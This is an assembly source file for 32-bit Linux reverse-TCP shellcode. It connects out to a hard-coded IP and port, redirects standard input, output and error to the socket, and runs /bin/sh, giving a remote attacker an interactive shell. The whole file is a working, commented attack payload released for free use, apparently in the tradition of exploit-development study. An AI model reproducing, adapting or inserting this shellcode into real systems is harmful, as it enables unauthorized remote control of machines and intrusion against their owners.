; Filename: 	shell_reverse_tcp.nasm
;
; Author:	John Pierce, CISSP, remsanattexascarverdotcom
;
; Purpose:	Call remote and throw a shell on connection
;
; This program was written by John W. Pierce, CISSP.  I enter it into
; the public domain.  You are free to use and/or redistribute it without 
; restriction, though attribution would be the right thing to do.  I hope
; it is of some value, but I make ABSOLUTELY NO WARRANTY OF ANY KIND.
;

global	_start

section	.text
_start:

	; socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	xor	eax,eax
	push	byte	6	; IPPROTO_TCP
	push	byte	1	; SOCK_STREAM
	push	byte	2	; AF_INET
	xor	ebx,ebx
	mov	al, 102		; sys_socketcall
	mov	bl, 1		; sys_socket
	mov	ecx, esp	; pointer to args
	int	0x80		; make the call
				; sockfd returned in eax
	mov	edi, eax	; store sockfd
; int connect(int sockfd,	(word) 
;	const struct sockaddr *addr, (struct, 8 bytes)
;       socklen_t addrlen); (byte)
;
; struct sockaddr_in { sa_family_t sin_family;  /* Address family      word     */
;			__be16 sin_port;       	/* Port number         word     */
;			struct in_addr sin_addr;/* Internet address    dword    */
;
; want to be able to easily change the remote port, addr, will use 
;	jmp/call/pop to retrieve it
	jmp	short	call_connect
return_to_connect:
	pop	esi		; port is now in esi, will be last two bytes of shellcode 
				; so easy to change w/out re-working
	push	dword [esi + 2]	; ipaddr
	push	word [esi]	; port number retrieved above
	xor	eax,eax
	mov	al,2
	push	ax		; AF_INET
	mov	ecx, esp 	; store the address of struct for a minute
	push	byte 16		; addrlen
	push	ecx		; pointer to structure
	push	edi		; sockfd
	xor	eax, eax
	mov	al, 102		; sys_socketcall
	mov	bl, 3		; sys_connect
	mov	ecx, esp	; pointer to args
	int	0x80
;
; once we have a connection, have to dup2 stdin, stdout, stderr to new_sockfd
; /usr/src/linux-source-3.2.6/arch/x86/include/asm/unistd_32.h:#efine __NR_dup2	 63
; dup2(int oldfd, int newfd)
;
	mov	ebx, edi	; sockfd to ebx, 1st arg to dup2
	xor	eax, eax
	xor	ecx, ecx	; o for stdin
	mov	al, 63		; dup2 syscall
	int	0x80
	mov	al, 63
	mov	cl, 1		; 1 for stdout
	int	0x80
	mov	al, 63
	mov	cl, 2		; 2 for stderr
	int	0x80
;
; and now we set up for the execve call
; 
; execve(const char *filename, char *const argv[], char *const envp[])
;
; need little endian representation of /bin//sh =  0x6e69622f 0x68732f2f
;
	xor	eax,eax		; double duty: for envp[] and terminate filename
	push	eax		; 
	mov	edx, esp	; pointer to envp[]
	push 	0x68732f2f	; /bin//sh
	push	0x6e69622f
	mov	ebx, esp	; *filename
	push	eax		; terminate argv
	push	ebx		; *argv[0]
	mov	ecx, esp	; *list of pointers to argv values
	mov	al, 11		; sys_execve
	int	0x80

call_connect:
	call return_to_connect
	listen_port	dw	0x3930		; storage for port number, little endian 
						; for 12345 currently
	ip_addr		dd	0x5945a8c0 	; address to call, 192.168.69.89
